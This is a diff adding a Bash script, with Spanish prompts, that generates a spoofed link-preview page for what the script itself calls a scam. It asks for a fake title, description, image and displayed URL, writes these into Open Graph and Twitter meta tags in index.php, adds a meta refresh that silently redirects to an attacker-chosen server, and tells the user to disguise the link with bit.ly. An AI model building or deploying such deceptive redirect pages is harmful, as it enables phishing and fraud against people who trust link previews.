@@ -1,0 +1,51 @@
+bash .banner
+echo "Introduce un titulo para la previsualizacion:"
+read titulo
+bash .banner
+echo "Introduce un enlace real para la previsualizacion:"
+read enlace
+bash .banner
+echo "Introduce una descripcion para la previsualizacion:"
+read descripcion
+bash .banner
+echo "Introduce la url que se copiaste anteriormente:"
+read miurl
+bash .banner
+echo "Introduce la url de una imagen de acorde con el scam:"
+read path
+bash .banner
+echo "Introduce la url del servidor que quieres que redireccione:"
+read url
+
+pwd=$(pwd)
+
+a='"og:title"'
+b='"og:url"'
+c='"twitter:url"'
+d='"og:description"'
+e='"og:image"'
+f='"refresh"'
+
+echo "<html>" > index.php
+echo "<meta property=$a content=%$titulo%>" >> index.php
+echo "<meta property=$b content=%$enlace%>" >> index.php
+echo "<meta property=$c content=%$enlace%>" >> index.php
+echo "<meta property=$d content=%$descripcion%>" >> index.php
+echo "<meta property=$e content=%$path%>"  >> index.php
+echo "<meta http-equiv=$f content=%1; url=$url%>" >> index.php
+echo "</html>" >> index.php
+echo "<?php" >> index.php
+echo "print(%Redirigiendo...%);" >> index.php
+echo "?>" >> index.php
+
+hasf=$(sed 's/%/"/g' index.php > in.php;mv in.php index.php)
+
+mov=$(mv index.php $pwd/.st/index.php)
+
+bash .banner
+echo "Tu enlace ha sido creado existosamente copia este enlace y"
+echo "acortalo con bit.ly: $miurl/index.php"
+echo ""
+echo "Presiona una tecla para continuar..."
+read pause
+bash PreVis.sh
